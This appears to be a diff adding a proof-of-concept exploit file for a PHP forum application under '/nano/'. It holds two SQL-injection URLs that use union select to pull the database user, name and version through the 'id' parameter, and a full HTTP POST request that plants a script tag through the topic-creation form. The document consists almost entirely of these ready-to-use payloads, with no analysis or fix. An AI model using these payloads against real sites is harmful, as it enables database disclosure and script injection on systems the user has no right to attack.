@@ -1,0 +1,22 @@
+To exploit the SQL-injection issues:
+
+http://www.example.com/nano/category.php?id=9%20and%201%20div%202%20union%20select%201,concat%28user%28%29,0x3a3a,database%28%29,0x3a3a,version%28%29%29,3
+
+http://www.example.com/nano/topic.php?id=10%20and%201%20div%200%20union%20select%201,concat%28user%28%29,0x3a3a,database%28%29,0x3a3a,version%28%29%29
+
+To exploit the cross-site scripting issue:
+
+POST /nano/create_topic.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://www.example.com/nano/create_topic.php
+Cookie: __utma=111872281.1795322081.1369810583.1369810583.1369810583.1; __utmz=111872281.1369810583.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); lang=en_US; PHPSESSID=gbf1u3p49bid3b1g4cnhuplco5
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 98
+topic_subject=Test+XSS&topic_cat=7&post_content=%3Cscript%3Ealert%28%22XSS%22%29%3B%3C%2Fscript%3E
+
+
